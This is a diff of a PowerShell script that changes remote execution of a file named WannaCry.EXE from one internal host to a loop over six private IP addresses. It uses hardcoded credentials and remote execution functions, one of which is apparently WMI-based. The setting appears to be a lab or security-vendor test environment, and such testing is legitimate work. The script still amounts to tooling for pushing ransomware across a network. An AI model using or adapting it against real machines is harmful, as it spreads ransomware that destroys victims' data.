@@ -1,6 +1,8 @@
-# Target machine and file path
-$targetIP = "10.0.10.200"
-$remoteExePath = "C:\Windows\Temp\WannaCry.EXE"  # Ensure this file exists
+# List of target IPs
+$ips = @("10.0.10.1", "10.0.10.102", "10.0.10.151", "10.0.10.150", "10.0.10.200", "10.0.10.100")
+
+# Path of the remote executable
+$remoteExePath = "C:\Windows\Temp\WannaCry.EXE"  # Ensure this file exists on each target machine
 
 # Credentials for remote execution
 $username = "trendmicro"
@@ -40,7 +42,9 @@ function Execute-RemoteWMI {
     }
 }
 
-# Execute the remote file
-Execute-RemoteCommand -target $targetIP -exePath $remoteExePath -cred $cred
+# Loop through all target machines and execute the file
+foreach ($ip in $ips) {
+    Execute-RemoteCommand -target $ip -exePath $remoteExePath -cred $cred
+}
 
 Write-Host "`nTask Completed."
